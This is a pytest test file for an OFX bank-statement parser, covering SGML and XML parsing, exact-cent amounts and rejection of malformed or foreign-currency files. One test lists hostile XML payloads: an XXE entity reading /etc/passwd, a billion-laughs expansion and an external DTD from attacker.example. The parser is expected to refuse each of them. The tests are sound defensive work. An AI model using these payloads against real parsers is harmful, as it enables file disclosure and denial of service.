"""OFX parsing: 1.x SGML + 2.x XML shaped like real bank files; hostile XML is refused, not parsed."""
from __future__ import annotations

from datetime import date

import pytest

from noctusai_lib.domain.finance.errors import FinanceError
from noctusai_lib.domain.finance.ofx import parse_amount_cents, parse_ofx

from .recon_support import ofx1, ofx2

LINES = (
    ("20261003", "1500.00", "202610030001", "PIX RECEBIDO JOAO DA SILVA"),
    ("20261005", "-89.90", "202610050002", "PAGAMENTO CONTA ENERGIA - ÁGUA"),
)


def test_ofx1_sgml_cp1252_with_accents():
    st = parse_ofx(ofx1(*LINES))
    assert [(l.posted_on, l.amount_cents, l.fitid) for l in st.lines] == [
        (date(2026, 10, 3), 150000, "202610030001"),
        (date(2026, 10, 5), -8990, "202610050002"),
    ]
    assert st.lines[1].description == "PAGAMENTO CONTA ENERGIA - ÁGUA"
    assert (st.period_start, st.period_end) == (date(2026, 10, 1), date(2026, 10, 31))


def test_ofx2_xml():
    st = parse_ofx(ofx2(*LINES))
    assert [l.amount_cents for l in st.lines] == [150000, -8990]
    assert st.lines[0].posted_on == date(2026, 10, 3)


def test_ofx1_html_entities_in_memo_are_unescaped_as_text():
    st = parse_ofx(ofx1(("20261003", "10.00", "F1", "A &amp; B")))
    assert st.lines[0].description == "A & B"


@pytest.mark.parametrize(
    "doctype",
    [
        '<!DOCTYPE OFX [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
        '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]>',
        '<!DOCTYPE OFX SYSTEM "http://attacker.example/evil.dtd">',
    ],
)
def test_xml_with_dtd_or_entities_is_refused(doctype):
    with pytest.raises(FinanceError) as e:
        parse_ofx(ofx2(*LINES, doctype=doctype))
    assert e.value.code == "extrato_invalido" and e.value.status_code == 422


def test_dtd_in_a_sgml_file_is_refused_too():
    hostile = ofx1(*LINES).replace(b"<OFX>", b'<!DOCTYPE x [<!ENTITY a "b">]><OFX>')
    with pytest.raises(FinanceError) as e:
        parse_ofx(hostile)
    assert e.value.code == "extrato_invalido"


@pytest.mark.parametrize("blob", [b"", b"hello world", b"<html><body>no</body></html>", b"<?xml version='1.0'?><OFX><unclosed>"])
def test_garbage_is_a_422_not_a_500(blob):
    with pytest.raises(FinanceError) as e:
        parse_ofx(blob)
    assert e.value.code == "extrato_invalido"


def test_truncated_sgml_is_refused():
    cut = ofx1(*LINES)
    cut = cut[: cut.index(b"</STMTTRN>", cut.index(b"202610050002"))]
    with pytest.raises(FinanceError):
        parse_ofx(cut)


def test_foreign_currency_is_refused():
    with pytest.raises(FinanceError) as e:
        parse_ofx(ofx2(*LINES, curdef="USD"))
    assert e.value.code == "extrato_moeda_invalida"


def test_repeated_fitid_in_one_file_is_disambiguated_not_collided():
    st = parse_ofx(ofx1(("20261003", "10.00", "SAME", "A"), ("20261003", "10.00", "SAME", "A")))
    assert len({l.fitid for l in st.lines}) == 2


def test_missing_fitid_gets_a_stable_derived_one():
    a = parse_ofx(ofx1(("20261003", "10.00", "", "A"))).lines[0].fitid
    b = parse_ofx(ofx1(("20261003", "10.00", "", "A"))).lines[0].fitid
    assert a == b and len(a) == 64


def test_zero_amount_lines_are_counted_not_stored():
    st = parse_ofx(ofx1(("20261003", "0.00", "Z", "ZERO"), ("20261003", "5.00", "Y", "OK")))
    assert len(st.lines) == 1 and st.skipped_zero == 1


@pytest.mark.parametrize(
    "raw, cents",
    [("100", 10000), ("-1234.56", -123456), ("1.234,56", 123456), ("1,5", 150), ("0.05", 5), ("-0,01", -1), ("1,234.56", 123456)],
)
def test_amounts_are_exact_cents(raw, cents):
    assert parse_amount_cents(raw) == cents


@pytest.mark.parametrize("raw", ["", "abc", "1.005", "NaN", "1e30"])
def test_bad_amounts_are_refused(raw):
    with pytest.raises(FinanceError):
        parse_amount_cents(raw)
